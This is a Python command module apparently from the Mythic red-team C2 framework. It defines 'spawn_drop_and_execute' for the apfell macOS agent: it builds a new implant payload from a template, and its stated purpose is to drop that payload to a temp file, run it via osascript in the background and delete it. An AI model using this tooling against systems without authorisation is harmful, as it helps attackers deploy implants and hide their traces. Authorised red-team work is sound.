from CommandBase import *
import json
from MythicFileRPC import *
from MythicPayloadRPC import *
import asyncio


class SpawnDropAndExecuteArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "template": CommandParameter(
                name="template",
                type=ParameterType.Payload,
                description="apfell agent to use as template to generate a new payload",
                supported_agents=["apfell"],
            )
        }

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                raise ValueError("Missing JSON arguments")
        else:
            raise ValueError("Missing arguments")


class SpawnDropAndExecuteCommand(CommandBase):
    cmd = "spawn_drop_and_execute"
    needs_admin = False
    help_cmd = "spawn_drop_and_execute"
    description = "Generate a new payload, drop it to a temp location, execute it with osascript as a background process, and then delete the file. Automatically reports back the temp file it created"
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_remove_file = False
    is_upload_file = False
    author = "@its_a_feature_"
    attackmapping = []
    argument_class = SpawnDropAndExecuteArguments

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        gen_resp = await MythicPayloadRPC(task).build_payload_from_template(
            task.args.get_arg("template")
        )
        if gen_resp.status == MythicStatus.Success:
            # we know a payload is building, now we want it
            while True:
                resp = await MythicPayloadRPC(task).get_payload_by_uuid(gen_resp.uuid)
                if resp.status == MythicStatus.Success:
                    if resp.build_phase == "success":
                        # it's done, so we can register a file for it
                        task.args.add_arg("template", resp.agent_file_id)
                        break
                    elif resp.build_phase == "error":
                        raise Exception(
                            "Failed to build new payload: " + resp.error_message
                        )
                    else:
                        await asyncio.sleep(1)
        return task

    async def process_response(self, response: AgentResponse):
        pass
